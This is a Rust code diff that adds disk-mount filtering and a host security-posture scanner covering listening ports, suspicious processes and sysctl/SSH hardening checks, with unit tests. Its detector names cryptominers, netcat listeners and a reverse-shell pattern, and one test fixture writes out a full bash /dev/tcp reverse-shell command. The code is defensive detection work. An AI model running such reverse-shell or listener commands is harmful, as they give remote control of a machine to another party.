@@ -259,6 +259,35 @@ pub extern "C" fn sys_gpu(nvidia_smi: *const u8, len: usize, hwmon: *const u8, h
 // ── Disk ─────────────────────────────────────────────────────────────────
 // Input: `df -P -B1` output. We filter to real filesystems and emit per-mount.
 
+// Pseudo-filesystems (RAM-backed, kernel-backed) — not storage the user owns.
+const PSEUDO_DEVS: &[&str] = &[
+    "tmpfs", "devtmpfs", "ramfs", "efivarfs", "overlay", "none", "udev", "devfs", "map",
+    "cgroup", "cgroup2", "squashfs",
+];
+
+// Read-only image mounts that are 100% full BY DESIGN: AppImage unpacks itself
+// to /tmp/.mount_<name><rand> via squashfuse, snaps mount squashfs under /snap.
+// Reporting them as "out of disk space" is a false alarm — skip them entirely.
+fn is_image_mount(dev: &str, mp: &str) -> bool {
+    dev.to_ascii_lowercase().ends_with(".appimage")
+        || mp.starts_with("/tmp/.mount_")
+        || mp.contains("/.mount_")
+        || mp == "/snap"
+        || mp.starts_with("/snap/")
+        || mp.starts_with("/var/lib/snapd/snap")
+}
+
+// A mount is reportable when it is real storage with a real capacity.
+// NB: matched on the device name, not the path — /run/media/<user>/<label>
+// (removable drives) is real storage and must survive, while /run itself
+// (device `tmpfs`) must not.
+fn is_reportable(dev: &str, mp: &str, total: u64) -> bool {
+    total > 0
+        && !PSEUDO_DEVS.contains(&dev)
+        && !dev.starts_with("fuse")
+        && !is_image_mount(dev, mp)
+}
+
 #[no_mangle]
 pub extern "C" fn sys_disk(df: *const u8, len: usize) -> *mut u8 {
     let df = read_str(df, len);
@@ -275,6 +304,7 @@ pub extern "C" fn sys_disk(df: *const u8, len: usize) -> *mut u8 {
         let total: u64 = cols[1].parse().unwrap_or(0);
         let used: u64 = cols[2].parse().unwrap_or(0);
         let pct: f64 = cols[4].trim_end_matches('%').parse::<f64>().unwrap_or(0.0);
+        if !is_reportable(cols[0], mp, total) { continue; }
         mounts.push(format!(
             r#"{{"mount":{},"total_b":{},"used_b":{},"used_pct":{:.1}}}"#,
             esc(mp), total, used, pct
@@ -451,6 +481,215 @@ pub extern "C" fn sys_net(
     ))
 }
 
+// ── Security posture ──────────────────────────────────────────────────────
+// Inputs (all raw text, host does the I/O):
+//   ss     — `ss -tulnpH` output (listening sockets; process names best-effort)
+//   ps     — `ps -eo pid=,user=,args=` output
+//   sysctl — "key value" lines the host reads from /proc/sys (missing = skip)
+//   sshd   — raw /etc/ssh/sshd_config ("" = no sshd installed → skip ssh checks)
+//   facts  — "key value" lines: secureboot enabled|disabled|unknown,
+//            luks 1|0|-1, updates N|-1  (-1/unknown = skip the check)
+// Output: {"ports":[…],"procs":[…],"checks":[…]}. Unknown never false-alarms:
+// a check whose input is missing is OMITTED, not reported as failing.
+
+/// Local addr → (ip, port). Handles "0.0.0.0:22", "[::]:22", "127.0.0.1:631", "*:80".
+fn split_addr_port(s: &str) -> (String, u16) {
+    let (ip, port) = match s.rfind(':') {
+        Some(i) => (&s[..i], &s[i + 1..]),
+        None => (s, ""),
+    };
+    (ip.trim_matches(|c| c == '[' || c == ']').to_string(), port.parse().unwrap_or(0))
+}
+
+fn is_loopback(ip: &str) -> bool {
+    ip.starts_with("127.") || ip == "::1" || ip == "localhost"
+}
+
+fn kv_lookup<'a>(block: &'a str, key: &str) -> Option<&'a str> {
+    block.lines().find_map(|l| {
+        let mut it = l.split_whitespace();
+        if it.next() == Some(key) { Some(it.next().unwrap_or("")) } else { None }
+    })
+}
+
+/// Effective value of an sshd_config directive — last non-comment wins.
+fn sshd_directive<'a>(cfg: &'a str, key: &str) -> Option<&'a str> {
+    let mut val = None;
+    for line in cfg.lines() {
+        let t = line.trim();
+        if t.starts_with('#') {
+            continue;
+        }
+        let mut it = t.split_whitespace();
+        if it.next().map(|k| k.eq_ignore_ascii_case(key)) == Some(true) {
+            val = it.next();
+        }
+    }
+    val
+}
+
+#[no_mangle]
+pub extern "C" fn sys_sec(
+    ss: *const u8, ss_len: usize,
+    ps: *const u8, ps_len: usize,
+    sysctl: *const u8, sy_len: usize,
+    sshd: *const u8, sh_len: usize,
+    facts: *const u8, fa_len: usize,
+) -> *mut u8 {
+    let ss = read_str(ss, ss_len);
+    let ps = read_str(ps, ps_len);
+    let sysctl = read_str(sysctl, sy_len);
+    let sshd = read_str(sshd, sh_len);
+    let facts = read_str(facts, fa_len);
+
+    // ── listening ports ──
+    // ss -tulnpH: "tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))"
+    // udp rows say UNCONN. Dedup by proto+ip+port (v4/v6 dual rows collapse).
+    let mut ports: Vec<String> = Vec::new();
+    let mut seen: Vec<(String, String, u16)> = Vec::new();
+    for line in ss.lines() {
+        let cols: Vec<&str> = line.split_whitespace().collect();
+        if cols.len() < 5 {
+            continue;
+        }
+        let proto = cols[0];
+        if proto != "tcp" && proto != "udp" {
+            continue;
+        }
+        let (ip, port) = split_addr_port(cols[4]);
+        if port == 0 {
+            continue;
+        }
+        let process = line
+            .split("users:((\"")
+            .nth(1)
+            .and_then(|r| r.split('"').next())
+            .unwrap_or("");
+        let key = (proto.to_string(), ip.clone(), port);
+        if seen.contains(&key) {
+            continue;
+        }
+        seen.push(key);
+        let exposed = !is_loopback(&ip);
+        ports.push(format!(
+            r#"{{"proto":{},"addr":{},"port":{},"process":{},"exposed":{}}}"#,
+            esc(proto), esc(&ip), port, esc(process), exposed
+        ));
+    }
+
+    // ── suspicious processes ──
+    // ps -eo pid=,user=,args=. Flag: binaries executing from world-writable
+    // dirs, known cryptominers, listener netcats, classic reverse-shell forms.
+    const MINERS: &[&str] = &["xmrig", "minerd", "kdevtmpfsi", "kinsing", "xmr-stak"];
+    let mut procs: Vec<String> = Vec::new();
+    for line in ps.lines() {
+        if procs.len() >= 12 {
+            break; // cap — the UI shows a short list, the count says the rest
+        }
+        let t = line.trim();
+        let mut it = t.splitn(3, char::is_whitespace);
+        let pid: u32 = it.next().unwrap_or("").parse().unwrap_or(0);
+        let user = it.next().unwrap_or("");
+        let args = it.next().unwrap_or("").trim();
+        if pid == 0 || args.is_empty() {
+            continue;
+        }
+        let exe = args.split_whitespace().next().unwrap_or("");
+        let reason = if exe.starts_with("/tmp/") || exe.starts_with("/dev/shm/")
+            || exe.starts_with("/var/tmp/")
+        {
+            "executing from a world-writable dir"
+        } else if MINERS.iter().any(|m| exe.rsplit('/').next() == Some(*m)) {
+            "known cryptominer name"
+        } else if (exe.ends_with("nc") || exe.ends_with("ncat") || exe.ends_with("socat"))
+            && args.split_whitespace().any(|a| a == "-l" || a.starts_with("-l"))
+        {
+            "netcat listener"
+        } else if args.contains("bash -i") && args.contains("/dev/tcp/") {
+            "reverse-shell pattern"
+        } else {
+            continue;
+        };
+        procs.push(format!(
+            r#"{{"pid":{},"user":{},"cmd":{},"reason":{}}}"#,
+            pid, esc(user), esc(args), esc(reason)
+        ));
+    }
+
+    // ── hardening checks ──
+    // (id, label, value, ok, hint) — emitted only when the input is present.
+    let mut checks: Vec<String> = Vec::new();
+    let mut push_check = |id: &str, label: &str, value: &str, ok: bool, hint: &str| {
+        checks.push(format!(
+            r#"{{"id":{},"label":{},"value":{},"ok":{},"hint":{}}}"#,
+            esc(id), esc(label), esc(value), ok, esc(hint)
+        ));
+    };
+
+    if let Some(v) = kv_lookup(sysctl, "randomize_va_space") {
+        let (val, ok) = match v { "2" => ("full", true), "1" => ("partial", false), _ => ("off", false) };
+        push_check("aslr", "ASLR", val, ok, "kernel.randomize_va_space=2 randomizes all mappings");
+    }
+    if let Some(v) = kv_lookup(sysctl, "ptrace_scope") {
+        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
+        push_check("ptrace", "ptrace scope", v, ok, "yama.ptrace_scope≥1 stops cross-process memory reads");
+    }
+    if let Some(v) = kv_lookup(sysctl, "kptr_restrict") {
+        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
+        push_check("kptr", "kptr restrict", v, ok, "kernel.kptr_restrict≥1 hides kernel pointers from exploits");
+    }
+    if let Some(v) = kv_lookup(sysctl, "dmesg_restrict") {
+        let ok = v == "1";
+        push_check("dmesg", "dmesg restrict", v, ok, "kernel.dmesg_restrict=1 hides kernel log from users");
+    }
+    if let Some(v) = kv_lookup(sysctl, "ip_forward") {
+        let ok = v == "0";
+        push_check("ipfwd", "IP forwarding", if ok { "off" } else { "on" }, ok,
+            "net.ipv4.ip_forward=0 unless this box routes/hosts VMs");
+    }
+    if let Some(v) = kv_lookup(sysctl, "unprivileged_bpf_disabled") {
+        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
+        push_check("bpf", "unpriv BPF", if ok { "blocked" } else { "allowed" }, ok,
+            "kernel.unprivileged_bpf_disabled=1 closes a common LPE surface");
+    }
+    if !sshd.is_empty() {
+        // OpenSSH defaults: PermitRootLogin prohibit-password, PasswordAuthentication yes
+        let root = sshd_directive(sshd, "PermitRootLogin").unwrap_or("prohibit-password");
+        let root_ok = root == "no" || root == "prohibit-password" || root == "without-password";
+        push_check("ssh_root", "SSH root login", root, root_ok,
+            "PermitRootLogin no — root is the #1 brute-force target");
+        let pass = sshd_directive(sshd, "PasswordAuthentication").unwrap_or("yes");
+        let pass_ok = pass.eq_ignore_ascii_case("no");
+        push_check("ssh_pass", "SSH password auth", pass, pass_ok,
+            "PasswordAuthentication no — keys only kills password brute-force");
+    }
+    match kv_lookup(facts, "secureboot") {
+        Some("enabled") => push_check("secboot", "Secure Boot", "enabled", true,
+            "blocks unsigned bootloaders/kernels (bootkits)"),
+        Some("disabled") => push_check("secboot", "Secure Boot", "disabled", false,
+            "enable in UEFI — blocks unsigned bootloaders/kernels"),
+        _ => {} // unknown → skip, never false-alarm
+    }
+    match kv_lookup(facts, "luks") {
+        Some("1") => push_check("luks", "Disk encryption", "LUKS", true,
+            "encrypted block device present"),
+        Some("0") => push_check("luks", "Disk encryption", "none", false,
+            "no encrypted volumes — a stolen disk is readable"),
+        _ => {}
+    }
+    if let Some(n) = kv_lookup(facts, "updates").and_then(|v| v.parse::<i64>().ok()) {
+        if n >= 0 {
+            push_check("updates", "Pending updates", &n.to_string(), n == 0,
+                "unpatched packages are the cheapest attack vector");
+        }
+    }
+
+    return_str(format!(
+        r#"{{"ports":[{}],"procs":[{}],"checks":[{}]}}"#,
+        join(&ports), join(&procs), join(&checks)
+    ))
+}
+
 // ── json obj builder ──────────────────────────────────────────────────────
 
 fn json_obj(fields: &[(String, String, bool)]) -> String {
@@ -519,6 +758,104 @@ mod tests {
         assert!(s.contains(r#""total_kb":16384000"#), "got: {s}");
         assert!(s.contains(r#""used_kb":7384000"#), "got: {s}");
         free_str(out_ptr);
+    }
+
+    #[test]
+    fn disk_skips_appimage_and_pseudo_mounts() {
+        let df = concat!(
+            "Filesystem 1B-blocks Used Available Capacity Mounted on\n",
+            "/dev/nvme0n1p4 1500000000000 135000000000 1365000000000 9% /\n",
+            "tmpfs 19000000000 2500000 18997500000 1% /run\n",
+            "/dev/sdb1 64000000000 32000000000 32000000000 50% /run/media/dev/USB\n",
+            "/home/u/Apps/Foo.AppImage 8388608 8388608 0 100% /tmp/.mount_FooAbC12\n",
+            "/dev/loop3 134217728 134217728 0 100% /snap/core22/1122\n",
+        );
+        let out_ptr = sys_disk(df.as_ptr(), df.len());
+        let len = str_len(out_ptr);
+        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
+        assert!(!s.contains(".mount_"), "AppImage mount must be skipped; got: {s}");
+        assert!(!s.contains("/snap/"), "snap mount must be skipped; got: {s}");
+        assert!(!s.contains(r#""mount":"/run""#), "tmpfs must be skipped; got: {s}");
+        assert!(s.contains(r#""mount":"/""#), "root must be kept; got: {s}");
+        assert!(s.contains("/run/media/dev/USB"), "removable drive must be kept; got: {s}");
+        assert!(s.contains(r#""root_used_pct":9.0"#), "got: {s}");
+        free_str(out_ptr);
+    }
+
+    fn sec_out(ss: &str, ps: &str, sysctl: &str, sshd: &str, facts: &str) -> String {
+        let p = sys_sec(
+            ss.as_ptr(), ss.len(),
+            ps.as_ptr(), ps.len(),
+            sysctl.as_ptr(), sysctl.len(),
+            sshd.as_ptr(), sshd.len(),
+            facts.as_ptr(), facts.len(),
+        );
+        let len = str_len(p);
+        let s = unsafe {
+            std::str::from_utf8_unchecked(std::slice::from_raw_parts(p, len)).to_string()
+        };
+        free_str(p);
+        s
+    }
+
+    #[test]
+    fn sec_parses_ports_exposure_and_dedup() {
+        let ss = concat!(
+            "tcp   LISTEN 0 4096   127.0.0.1:631   0.0.0.0:* users:((\"cupsd\",pid=9,fd=7))\n",
+            "tcp   LISTEN 0 128    0.0.0.0:22      0.0.0.0:* users:((\"sshd\",pid=1,fd=3))\n",
+            "tcp   LISTEN 0 128    [::]:22         [::]:*\n",
+            "udp   UNCONN 0 0      0.0.0.0:5353    0.0.0.0:*\n",
+        );
+        let s = sec_out(ss, "", "", "", "");
+        assert!(s.contains(r#""port":22,"process":"sshd","exposed":true"#), "got: {s}");
+        assert!(s.contains(r#""addr":"127.0.0.1","port":631,"process":"cupsd","exposed":false"#), "got: {s}");
+        // v6 dup of :22 has a DIFFERENT addr → kept; same-key rows dedup
+        assert_eq!(s.matches(r#""port":22"#).count(), 2, "got: {s}");
+        assert!(s.contains(r#""proto":"udp","addr":"0.0.0.0","port":5353"#), "got: {s}");
+    }
+
+    #[test]
+    fn sec_flags_suspicious_procs_only() {
+        let ps = concat!(
+            "  1 root /sbin/init splash\n",
+            " 77 evil /tmp/.hidden/backdoor -d\n",
+            " 88 bob  xmrig --url pool.example\n",
+            " 99 bob  ncat -l 4444\n",
+            "111 bob  bash -c bash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
+            "222 dev  /usr/bin/vim /tmp/notes.txt\n", // /tmp ARG is fine — exe isn't in /tmp
+        );
+        let s = sec_out("", ps, "", "", "");
+        assert!(s.contains("world-writable"), "got: {s}");
+        assert!(s.contains("cryptominer"), "got: {s}");
+        assert!(s.contains("netcat listener"), "got: {s}");
+        assert!(s.contains("reverse-shell"), "got: {s}");
+        assert!(!s.contains("init"), "init must not be flagged; got: {s}");
+        assert!(!s.contains("vim"), "arg-only /tmp must not be flagged; got: {s}");
+    }
+
+    #[test]
+    fn sec_checks_from_sysctl_sshd_and_facts() {
+        let sysctl = "randomize_va_space 2\nptrace_scope 0\nkptr_restrict 1\nip_forward 1\n";
+        let sshd = "#PermitRootLogin prohibit-password\nPermitRootLogin yes\nPasswordAuthentication no\n";
+        let facts = "secureboot disabled\nluks 1\nupdates 4\n";
+        let s = sec_out("", "", sysctl, sshd, facts);
+        assert!(s.contains(r#""id":"aslr","label":"ASLR","value":"full","ok":true"#), "got: {s}");
+        assert!(s.contains(r#""id":"ptrace","label":"ptrace scope","value":"0","ok":false"#), "got: {s}");
+        assert!(s.contains(r#""id":"ipfwd","label":"IP forwarding","value":"on","ok":false"#), "got: {s}");
+        // last non-comment directive wins → root login yes = fail; password no = ok
+        assert!(s.contains(r#""id":"ssh_root","label":"SSH root login","value":"yes","ok":false"#), "got: {s}");
+        assert!(s.contains(r#""id":"ssh_pass","label":"SSH password auth","value":"no","ok":true"#), "got: {s}");
+        assert!(s.contains(r#""id":"secboot","label":"Secure Boot","value":"disabled","ok":false"#), "got: {s}");
+        assert!(s.contains(r#""id":"luks","label":"Disk encryption","value":"LUKS","ok":true"#), "got: {s}");
+        assert!(s.contains(r#""id":"updates","label":"Pending updates","value":"4","ok":false"#), "got: {s}");
+        // dmesg_restrict was NOT in the input → check must be absent, not failing
+        assert!(!s.contains("dmesg"), "missing input must omit the check; got: {s}");
+    }
+
+    #[test]
+    fn sec_unknowns_are_skipped_never_failed() {
+        let s = sec_out("", "", "", "", "secureboot unknown\nluks -1\nupdates -1\n");
+        assert_eq!(s, r#"{"ports":[],"procs":[],"checks":[]}"#, "got: {s}");
     }
 
     #[test]
